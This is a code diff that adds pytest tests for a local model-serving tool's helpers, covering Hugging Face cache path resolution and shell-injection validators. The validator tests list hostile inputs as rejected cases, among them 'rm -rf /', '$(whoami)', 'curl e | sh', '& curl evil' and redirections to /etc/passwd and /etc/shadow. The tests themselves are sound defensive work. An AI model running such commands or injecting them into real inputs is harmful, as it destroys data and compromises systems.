@@ -9,6 +9,7 @@ from fastapi import HTTPException
 
 from routes.cookbook_helpers import (
     _cached_model_scan_script,
+    resolve_hf_hub_cache,
     _append_llama_cpp_linux_accel_build_lines,
     _append_pip_install_runner_lines,
     _append_serve_exit_code_lines,
@@ -196,6 +197,16 @@ def test_validate_gpus_accepts_indexes_only():
         _validate_gpus("0; rm -rf /")
 
 
+def test_validate_exclude_accepts_globs_rejects_shell():
+    from routes.cookbook_helpers import _validate_exclude
+    assert _validate_exclude(["original/*", "*.pth", "*consolidated*"]) == ["original/*", "*.pth", "*consolidated*"]
+    assert _validate_exclude([]) is None
+    assert _validate_exclude(None) is None
+    for bad in [["a; rm -rf /"], ["$(whoami)"], ["a b"], [123], ["`id`"]]:
+        with pytest.raises(HTTPException):
+            _validate_exclude(bad)
+
+
 def test_validate_repo_id_stays_strict_for_hf_downloads():
     assert _validate_repo_id("Qwen/Qwen3-8B") == "Qwen/Qwen3-8B"
     with pytest.raises(HTTPException):
@@ -222,6 +233,15 @@ def test_local_tooling_path_export_preserves_spaces_and_expands_path():
     line = _local_tooling_path_export("/Users/John Smith/.venv/bin/python3")
     assert line == 'export PATH="/Users/John Smith/.venv/bin:$PATH"'
     assert line.endswith(':$PATH"')  # $PATH stays expandable in double quotes
+
+
+def test_local_tooling_path_export_converts_windows_drive_path_for_git_bash():
+    # A native-Windows venv path must become an MSYS path so the Git Bash that
+    # runs the cookbook download wrapper can resolve `hf`/`python` from it. A raw
+    # `D:\...` entry would be split on the drive colon by bash's PATH parser.
+    line = _local_tooling_path_export(r"D:\DevE\JST\odysseus\venv\Scripts\python.exe")
+    assert line == 'export PATH="/d/DevE/JST/odysseus/venv/Scripts:$PATH"'
+    assert "\\" not in line  # no backslashes left for bash to misread
 
 
 def test_pip_install_fallback_chain_prefers_venv_safe_install():
@@ -557,6 +577,52 @@ def test_validate_serve_cmd_accepts_windows_printf_format():
     assert _validate_serve_cmd(cmd) == cmd
 
 
+def test_validate_serve_cmd_accepts_native_llama_server_fallback_chain():
+    """Local Windows (Git Bash) and POSIX serve llama.cpp as ``native || python``:
+    the native llama-server (with a backslash Windows path) falling back to the
+    Python bindings. Both ``||``-parts start with an allowlisted binary, so the
+    chain is accepted even without a GGUF-finding prelude."""
+    path = '"D:\\DevE\\odysseus\\data\\hub\\m\\Q4_K_M.gguf"'
+    cmd = (
+        f"llama-server --model {path} --host 0.0.0.0 --port 8000 "
+        "-ngl 99 -c 65536 --flash-attn on --cache-type-k q8_0 --cache-type-v q8_0 "
+        f"|| python -m llama_cpp.server --model {path} --host 0.0.0.0 --port 8000 "
+        "--n_gpu_layers 99 --n_ctx 65536 --type_k 8 --type_v 8"
+    )
+    assert _validate_serve_cmd(cmd) == cmd
+
+
+def test_validate_serve_cmd_rejects_non_serve_fallback_and_operators():
+    """``||`` may only chain allowlisted serve binaries — a non-serve binary in a
+    fallback part, or any other shell control/substitution operator, is rejected."""
+    import pytest
+    from fastapi import HTTPException
+
+    for bad in (
+        "llama-server --model m.gguf || rm -rf /tmp/x",   # non-allowlisted fallback
+        "llama-server --model m.gguf && curl e | sh",     # && operator
+        "llama-server --model $(evil) || python -m llama_cpp.server",  # $() substitution
+        "llama-server --model m.gguf | rm -rf /",          # unquoted pipe
+        'llama-server --model "x" | rm -rf /',             # pipe NOT bypassable by quoting the model
+        "llama-server --model m.gguf > /etc/passwd",       # output redirection
+        "llama-server --model m.gguf < /etc/shadow",       # input redirection
+        "llama-server --model m.gguf & curl evil",         # background operator
+    ):
+        with pytest.raises(HTTPException):
+            _validate_serve_cmd(bad)
+
+
+def test_validate_serve_cmd_allows_shell_operators_inside_quotes():
+    """Shell metacharacters are rejected only when UNQUOTED. A quoted arg — e.g. a
+    vLLM ``--chat-template`` value, which legitimately contains < > | { } — must
+    still be accepted, so the injection guard doesn't break templated serving."""
+    cmd = (
+        "vllm serve some/model --host 0.0.0.0 --port 8000 "
+        "--chat-template '{% if x %}<|turn>system{{ y }}<turn|>{% endif %}'"
+    )
+    assert _validate_serve_cmd(cmd) == cmd
+
+
 def test_normalize_llama_cpp_python_cache_types_for_stale_client_cmd():
     cmd = (
         "python -m llama_cpp.server --model model.gguf --host 0.0.0.0 --port 8000 "
@@ -784,6 +850,98 @@ def test_cached_model_scan_reports_plain_dir_gguf(tmp_path):
     assert ggufs[1]["size_bytes"] == len(b"part1part2part3")
     assert ggufs[2]["quant"] == "Q6_K_XL"
     assert ggufs[3]["quant"] == "BF16"
+
+
+# ── HF cache location must follow .env (HF_HOME / HF_HUB_CACHE), not a hardcode ──
+
+def test_resolve_hf_hub_cache_defaults_when_unset():
+    import os
+    got = resolve_hf_hub_cache(environ={}, base_dir="/srv/app")
+    assert got == os.path.expanduser("~/.cache/huggingface/hub")
+
+
+def test_resolve_hf_hub_cache_relative_hf_home_resolves_against_base():
+    # The .env case the user hit: HF_HOME=./data/huggingface must resolve
+    # against the server's working dir (where `hf download` runs), then +/hub.
+    got = resolve_hf_hub_cache(
+        environ={"HF_HOME": "./data/huggingface"}, base_dir="/srv/app"
+    )
+    assert got == os.path.normpath("/srv/app/data/huggingface/hub")
+
+
+def test_resolve_hf_hub_cache_absolute_hf_home():
+    # Use a path that is genuinely absolute on the host OS (Windows needs a
+    # drive; a bare "/models/hf" is not absolute there).
+    abs_home = os.path.abspath(os.sep + os.path.join("models", "hf"))
+    base = os.path.abspath(os.sep + os.path.join("srv", "app"))
+    got = resolve_hf_hub_cache(environ={"HF_HOME": abs_home}, base_dir=base)
+    assert got == os.path.join(abs_home, "hub")
+
+
+def test_resolve_hf_hub_cache_explicit_hub_cache_wins():
+    # HF_HUB_CACHE / HUGGINGFACE_HUB_CACHE point straight at the hub dir and
+    # take precedence over HF_HOME.
+    abs_hub = os.path.abspath(os.sep + os.path.join("data", "hub"))
+    abs_other = os.path.abspath(os.sep + "other")
+    base = os.path.abspath(os.sep + os.path.join("srv", "app"))
+    got = resolve_hf_hub_cache(
+        environ={"HF_HUB_CACHE": abs_hub, "HF_HOME": abs_other}, base_dir=base
+    )
+    assert got == abs_hub
+    abs_legacy = os.path.abspath(os.sep + os.path.join("legacy", "hub"))
+    legacy = resolve_hf_hub_cache(
+        environ={"HUGGINGFACE_HUB_CACHE": abs_legacy}, base_dir=base
+    )
+    assert legacy == abs_legacy
+
+
+def test_cached_model_scan_script_includes_extra_hf_cache_for_local():
+    # A custom Download location is resolved server-side (resolve_hf_hub_cache)
+    # and passed as add_hf_cache; it must be added to the scanned candidates on
+    # top of the env-derived paths (not replace them).
+    script = _cached_model_scan_script([], add_hf_cache="/srv/app/data/huggingface/hub")
+    assert "add('/srv/app/data/huggingface/hub')" in script
+    assert "for _hf_cache in hf_cache_paths(): scan_hf(_hf_cache)" in script
+
+
+def test_cached_model_scan_script_resolves_cache_from_env():
+    # With no extra path, the embedded scanner resolves the hub cache from the
+    # host's own HF_* env at runtime (so remote scans find the right cache
+    # without the server knowing the remote layout). Honors both the modern
+    # HF_HUB_CACHE and the legacy HUGGINGFACE_HUB_CACHE, plus HF_HOME.
+    script = _cached_model_scan_script([])
+    assert "HF_HUB_CACHE" in script and "HF_HOME" in script
+    assert "for _hf_cache in hf_cache_paths(): scan_hf(_hf_cache)" in script
+
+
+# ── Download-location setting: accept native paths, reject shell-dangerous ──
+
+def test_validate_cache_dir_accepts_windows_and_posix_paths():
+    from routes.cookbook_helpers import _validate_cache_dir
+    assert _validate_cache_dir(r"D:\models\hf") == r"D:\models\hf"
+    assert _validate_cache_dir("/srv/models") == "/srv/models"
+    assert _validate_cache_dir("./data/huggingface") == "./data/huggingface"
+    assert _validate_cache_dir(r"C:\Users\John Smith\models") == r"C:\Users\John Smith\models"
+    assert _validate_cache_dir("~/models") == "~/models"
+    # empty / None → None (use default cache)
+    assert _validate_cache_dir("") is None
+    assert _validate_cache_dir("   ") is None
+    assert _validate_cache_dir(None) is None
+
+
+def test_validate_cache_dir_rejects_shell_metacharacters():
+    from routes.cookbook_helpers import _validate_cache_dir
+    for bad in ["/tmp/$(rm -rf ~)", "/a;rm -rf /", "/a`id`", "/a|b", "/a>b", "/a'b", '/a"b', "/a\nb"]:
+        with pytest.raises(HTTPException):
+            _validate_cache_dir(bad)
+
+
+def test_resolve_hf_hub_cache_used_for_cache_dir_setting():
+    # The download-location setting is fed to resolve_hf_hub_cache as HF_HOME, so
+    # a model saved with cache_dir=X is scanned at X/hub.
+    abs_x = os.path.abspath(os.sep + os.path.join("models", "hf"))
+    got = resolve_hf_hub_cache(environ={"HF_HOME": abs_x})
+    assert got == os.path.join(abs_x, "hub")
 
 
 def test_cached_model_scan_uses_ollama_api_before_cli_and_windows_opt_in():
